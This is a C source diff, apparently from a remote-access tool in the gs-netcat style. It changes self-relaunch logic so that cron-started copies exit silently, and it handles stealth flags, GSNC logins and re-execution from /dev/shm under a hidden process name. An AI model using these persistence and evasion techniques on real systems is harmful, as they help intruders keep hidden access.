@@ -316,10 +316,6 @@ try_changeargv0(int argc, char *argv[]) {
 
 	if (GSNC_config_read(exename) != 0) {
 		DEBUGF("GSNC_config_read() failed\n");
-		// Logins via GSNC set GS_CONFIG_READ=0 and GSNC. Must exit or otherwise
-		// uname -a is started for every gsnc login
-		if ((!(gopt.flags & GSC_FL_WANT_CONFIG_READ)) && (getenv("GSNC") != NULL))
-			exit(0);
 		return;
 	}
 
@@ -332,17 +328,18 @@ try_changeargv0(int argc, char *argv[]) {
 	// - Check actual binary /usr/sbin/supervise (in case /dev/shm re-execution failed)
 	// - Check if executed from /dev/shm as PROC_HIDDENNAME
 	// - might be started as with ld-linux.so and /dev/shm-reexec failed or succeeded (check both cases).
+	// - MUST exit with ZERO or else crontab sends message about failed job.
 	if (ldso) {
 		if (is_running(ldso, true, exename) == 0)
-			exit(EBUSY); // ld-linux & /dev/shm-rexec failed.
+			exit(0); // ld-linux & /dev/shm-rexec failed.
 	} else {
 		if (is_running(exename, true, NULL) == 0)
-			exit(EBUSY);
+			exit(0);
 	}
 
 	// /dev/shm-reexec succeeded (now /proc/self/exe is proc_hiddenname)
 	if (is_running(gopt.proc_hiddenname, false, NULL) == 0)
-		exit(EBUSY);
+		exit(0);
 
 	// First try to copy & execute myself as /dev/shm/PROC_HIDDENNAME
 	if (try_cpexecme(exename, argv) == 0)
@@ -433,6 +430,10 @@ init_defaults1(int argc, char *argv[]) {
 	ptr = GS_GETENV2("CONFIG_READ");
     if ((ptr == NULL) || (*ptr != '0'))
 		gopt.flags |= GSC_FL_WANT_CONFIG_READ;
+	if (!(gopt.flags & GSC_FL_WANT_CONFIG_READ)) {
+		gopt.flags &= ~GSC_FL_IS_STEALTH; // implied. if CONFIG_READ=0
+		return;
+	}
 	
 	try_changeargv0(argc, argv); // If wanted, calls GSNC_config_read()
 	if (gopt.flags & GSC_FL_CONFIG_CHECK)
@@ -492,6 +493,13 @@ init_defaults2(int argc, int *argcptr, char **argvptr[])
 	add_env_argv(argcptr, argvptr);
 	if (argcptr != NULL)
 		gopt.argc = *argcptr;
+
+	// If log in via GSNC and no args then do not execute the bashrc's gsnc binary
+	// (or it would ask with "Enter Secret")
+	// GS_ALLOWNOARG to prompt for "Enter Secret" if called from hackshell's gsnc
+	// and without any args.
+	if ((!(gopt.flags & GSC_FL_WANT_CONFIG_READ)) && (gopt.argc <= 1) && (getenv("GSNC")) && (getenv("_GS_ALLOWNOARG") == NULL))
+		exit(EINVAL);
 
 	gopt.app_keepalive_sec = GS_APP_KEEPALIVE;
 }
